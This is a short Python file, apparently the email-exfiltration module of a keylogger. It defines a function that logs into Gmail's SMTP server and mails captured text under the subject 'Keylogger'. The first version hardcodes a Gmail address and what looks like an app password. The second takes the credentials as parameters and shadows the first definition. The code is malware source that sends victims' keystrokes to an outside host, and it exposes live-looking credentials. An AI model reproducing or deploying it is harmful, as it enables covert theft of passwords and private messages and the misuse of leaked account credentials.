from email.message import EmailMessage
import smtplib

def mandar_correo(texto,destinatario):
    remitente = "javyko34@gmail.com"
    mensaje = texto
    email = EmailMessage()
    email["From"] = remitente
    email["To"] = destinatario
    email["Subject"] = "Keylogger"
    email.set_content(mensaje)
    smtp = smtplib.SMTP_SSL("smtp.gmail.com")
    smtp.login(remitente, "rmbrgjsvzijsntou")
    smtp.sendmail(remitente, destinatario, email.as_string())
    smtp.quit()

def mandar_correo(texto,remitente,contrasena,destinatario,asunto):

    email = EmailMessage()
    email["From"] = remitente
    email["To"] = destinatario
    email["Subject"] = asunto
    email.set_content(texto)
    smtp = smtplib.SMTP_SSL("smtp.gmail.com")
    smtp.login(remitente, contrasena)
    smtp.sendmail(remitente, destinatario, email.as_string())
    smtp.quit()